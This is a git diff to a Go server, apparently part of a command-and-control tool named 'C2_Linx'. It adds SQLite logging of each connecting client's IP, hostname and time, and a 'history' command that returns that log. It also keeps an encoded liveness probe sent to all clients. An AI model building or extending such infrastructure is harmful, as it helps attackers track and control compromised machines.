@@ -3,9 +3,13 @@
 package main
 
 import (
-	"C2_Linx/encode"
 	"C2_Linx/db"
+	"database/sql"
 	"time"
+
+	//"C2_Linx/db"
+	"C2_Linx/encode"
+	//"time"
 
 	//"encoding/base32"
 	"fmt"
@@ -17,6 +21,8 @@ import (
 var ConnMap map[string]net.Conn = make(map[string]net.Conn)  //声明一个集合
 var Master2 map[string]net.Conn = make(map[string]net.Conn)  //声明一个集合
 var mastername string
+var db1 *sql.DB
+
 //ConnMap := make(map[string]net.Conn)
 
 func main() {
@@ -29,7 +35,12 @@ func main() {
 
 	defer listen_socket.Close()
 	fmt.Println("server is wating ....")
+	db1, err = sql.Open("sqlite3", "userDB.db")
 
+	//db1, err = sql.Open("sqlite3", "D:\\go1.20.2.windows-amd64\\go\\src\\C2_Linx\\db\\userDB.db")
+	if err != nil {
+		fmt.Println("db open err")
+	}
 	for {
 		conn, err := listen_socket.Accept()  //收到来自客户端发来的消息
 		if err != nil {
@@ -116,11 +127,12 @@ func handle(conn net.Conn) {
 			//		v.Write([]byte("[" + msg_str[1] + "]: join..."))
 			//	}
 			//}
+			ConnMap[msg_str[1]] = conn   //客户端的conn 很关键
+
 			currentTime := time.Now()
 			currentTimeString := currentTime.Format("2006-01-02 15:04:05")//整个format很奇怪，只能是这个日期才能精准识别 不知道linux上会不会有bug
 			fmt.Println(currentTimeString)
-			ConnMap[msg_str[1]] = conn   //客户端的conn 很关键
-			db.To_Insert(conn.RemoteAddr().String(),msg_str[1],currentTimeString)
+			db.Insert(db1,conn.RemoteAddr().String(),msg_str[1],currentTimeString)
 
 		case "say":   //转发消息
 			for k, v := range ConnMap {  //k指客户端昵称   v指客户端连接服务器端后的地址
@@ -179,6 +191,17 @@ func handle(conn net.Conn) {
 
 				}
 			}
+
+
+		case "history":
+			b :=db.Query2(db1)
+			fmt.Println(len(b))
+			var name string = ""
+			for i:=0;i<len(b);i++{
+				name ="|" +b[i].Hostname+"  " + b[i].ConnIP+"  " +b[i].Time+"|"+"\n"+name
+			}
+			fmt.Println(name)
+			conn.Write([]byte(name))
 		case "checkalive":
 			for name, v := range ConnMap {
 				_, err := v.Write([]byte(encode.Enc("checkalive|alive")))
